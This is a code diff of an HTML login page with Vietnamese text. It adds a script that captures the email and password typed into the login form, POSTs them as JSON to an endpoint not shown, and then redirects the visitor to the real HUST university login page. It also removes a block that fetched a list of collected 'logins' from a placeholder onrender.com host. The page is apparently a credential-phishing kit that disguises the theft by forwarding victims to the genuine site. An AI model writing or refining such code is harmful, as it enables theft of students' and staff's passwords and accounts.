@@ -63,7 +63,7 @@
         </div>
     </div>
 </body>
-
+<script>
 document.getElementById("login-form").addEventListener("submit", function(event) {
     event.preventDefault();
 
@@ -74,19 +74,10 @@ document.getElementById("login-form").addEventListener("submit", function(event)
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ email, password })
-    }).then(response => response.json())
-    .then(() => {
+    }).then(() => {
         window.location.href = "https://tsa.hust.edu.vn/dang-nhap";
     }).catch(error => console.error("Lỗi:", error));
 });
-
-
-fetch("https://your-app.onrender.com/get-logins")
-    .then(response => response.json())
-    .then(data => {
-        console.log("Danh sách đăng nhập:", data);
-    })
-    .catch(error => console.error("Lỗi lấy dữ liệu:", error));
-
+</script>
 
 </html>
